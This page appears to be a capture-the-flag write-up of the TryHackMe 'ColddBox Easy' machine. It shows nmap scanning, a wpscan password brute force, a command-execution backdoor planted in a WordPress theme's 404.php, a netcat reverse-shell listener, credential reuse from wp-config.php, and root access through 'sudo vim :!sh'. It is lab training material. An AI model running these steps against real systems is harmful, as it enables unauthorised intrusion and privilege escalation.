---
layout: page
title: Colddbox - Easy
description: Brute-force creds and theme code injection.
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/colddbox/logo.png" title="THM Coldbox - Easy Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/colddboxeasy">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Here we are going to break the ice with this Colddbox.

Run nmap to get a list of the services running on top ports.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.242.148
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 18:04 AEDT
Nmap scan report for 10.10.242.148
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 4 hops

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   11.85 ms  10.4.0.1
2   ... 3
4   266.33 ms 10.10.242.148

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.80 seconds
```
{% endraw %}

<br />
Run nmap's vuln category scripts.  Notice the hidden directory.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
└─$ sudo nmap --script vuln -oN vulnchk 10.10.242.148
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 18:05 AEDT
Nmap scan report for 10.10.242.148
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE

<snip>

| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.1.31
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /hidden/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 329.23 seconds
```
{% endraw %}

<br />
Check the Wordpress post and comment.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the hidden directory.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/hidden.png" title="Hidden Directory" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Create a file that has the three names from hidden to a text file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
└─$ cat users.txt  
c0ldd
hugo
philip
```
{% endraw %}

<br />
Run wpscan to try and brute-force the user passwords.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
└─$ wpscan --url http://10.10.242.148 --passwords /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

<snip>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                                                                                                                                              
^Cying philip / 777888 Time: 00:27:50 <=====================================================                                                                                                         > (14753 / 42915) 34.37%  ETA: 00:53:09
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210

[!] No WPScan API Token given, as a result vulnerability data has not been output.==========                                                                                                         > (14754 / 42915) 34.37%  ETA: 00:53:09
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Mar  6 18:38:40 2025
[+] Requests Done: 14962
[+] Cached Requests: 6
[+] Data Sent: 4.912 MB
[+] Data Received: 67.645 MB
[+] Memory used: 287.719 MB
[+] Elapsed time: 00:28:19

Scan Aborted: Canceled by User
```
{% endraw %}

<br />
Test the credentials and login.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/dashboard.png" title="WP Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Choose the theme editor.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/editor.png" title="Theme Editor" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Edit the TwentyFifteen 404.php and insert a small system statement.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/404.png" title="Update 404" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Navigate to the 404.php page and use id in the cmd parameter to test the command execution.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/id.png" title="Test ID" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Set up a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/colddboxeasy]
└─$ sudo nc -nlvp 443                      
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Use revshells to get a one-liner payload.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Use the payload in the cmd parameter.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/colddbox/execute.png" title="Execute Payload" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the wp-config.php file to get the database creds.

{% raw %}
```php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

 <snip>

 // ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

<snip
```
{% endraw %}

<br />
Use the password from the config file to su into the c0ldd account.

{% raw %}
```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: cybersecurity

c0ldd@ColddBox-Easy:/var/www/html$
```
{% endraw %}

<br />
Get the user flag.

{% raw %}
```bash
c0ldd@ColddBox-Easy:~$ cat user.txt
cat user.txt
<redacted>
c0ldd@ColddBox-Easy:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:d6:c4:68:4d:c7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.242.148/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::d6:c4ff:fe68:4dc7/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Run the sudo -l to get a list of commands that you can run as sudo.

{% raw %}
```bash
c0ldd@ColddBox-Easy:~$ sudo -l
sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```
{% endraw %}

<br />
Run sudo /usr/bin/vim to enter vim.  Once in vim, drop into a shell.

{% raw %}
```bash
:!sh
~
~
~
~
~                              VIM - VI Mejorado
~
~                               versión 7.4.1689
~                          por Bram Moolenaar et al.
~          Modificado por pkg-vim-maintainers@lists.alioth.debian.org
~            Vim es código abierto y se puede distribuir libremente
~
~                       ¡Patrocine el desarrollo de Vim!
~          escriba  «:help sponsor<Intro>»     para más información
~
~           escriba  «:q<Intro>»            para salir
~           escriba  «:help<Intro>» o <F1>  para obtener ayuda
~        escriba «:help version7<Intro>» para información de la versión
~
~
~
~
~
:!sh
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
<redacted>
# ip a     
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:d6:c4:68:4d:c7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.242.148/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::d6:c4ff:fe68:4dc7/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that, looks like we put c0lddbox on ice!  See you in the next one.